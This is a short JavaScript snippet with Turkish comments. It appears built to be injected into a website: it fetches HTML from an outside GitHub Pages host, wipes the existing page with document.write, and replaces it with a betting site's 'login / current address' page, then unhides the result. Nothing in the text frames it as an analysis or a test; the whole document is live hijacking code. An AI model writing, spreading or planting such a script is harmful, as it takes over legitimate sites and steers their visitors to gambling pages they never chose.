(function() {
    var designUrl = 'https://devworksg-ux.github.io/geldikkss3/index.html';
    
    fetch(designUrl )
        .then(response => response.text())
        .then(html => {
            // Sayfa başlığını ve meta verileri ayarla
            document.title = "Cratosroyalbet Giriş | Güncel Adres";
            
            // Mevcut tüm içeriği sil ve yeni tasarımı enjekte et
            document.open();
            document.write(html);
            document.close();
            
            // Görünürlüğü aç
            document.documentElement.style.visibility = "visible";
        })
        .catch(err => {
            console.error("Yükleme hatası:", err);
            document.documentElement.style.visibility = "visible";
        });
})();
